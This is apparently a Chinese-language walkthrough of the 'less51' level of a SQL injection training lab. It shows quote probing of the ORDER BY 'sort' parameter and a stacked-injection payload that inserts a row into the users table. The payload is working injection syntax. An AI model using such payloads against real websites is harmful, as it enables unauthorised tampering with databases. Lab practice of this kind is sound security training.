# GET -Error based -ORDER BY CLAUSE -string -Stacked injection  
TAG：GET型注入、堆叠注入、ORDER BY参数可控  
## 漏洞利用
此less是less50的变种，参数包裹方式发生了改变    
![less51_1](images\less51_1.png)  
  
当```?sort=1'```时，页面报错  
![less51_2](images\less51_2.png)  
  
当```?sort=1"```时，页面正常显示，这说明参数被单引号包裹  
![less51_3](images\less51_3.png)  
  
构造堆叠注入测试payload:```?sort=1';insert into users(id,username,password) values ('26','less51','hello')--+```  
![less51_4](images\less51_4.png)  